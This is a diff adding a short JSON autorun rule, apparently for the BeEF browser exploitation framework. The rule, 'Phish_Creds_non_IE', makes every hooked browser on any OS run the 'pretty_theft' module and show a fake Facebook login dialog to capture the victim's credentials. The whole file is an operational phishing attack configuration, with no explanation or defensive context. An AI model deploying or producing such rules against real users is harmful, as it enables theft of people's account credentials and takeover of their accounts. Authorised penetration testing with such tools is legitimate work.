@@ -1,0 +1,20 @@
+{
+  "name": "Phish_Creds_non_IE",
+  "author": "http://github.com/highmeh",
+  "browser": "ALL",
+  "browser_version": "ALL",
+  "os": "ALL",
+  "os_version": "ALL",
+  "modules": [{
+    "name": "pretty_theft",
+    "condition": null,
+    "options": {
+      "choice": "Facebook",
+      "backing": "Grey",
+      "imgsauce": "https://www.yourdomain.com/ui/media/images/beef.png"
+    }
+  }],
+  "execution_order": [0],
+  "execution_delay": [1000],
+  "chain_mode": "sequential"
+}
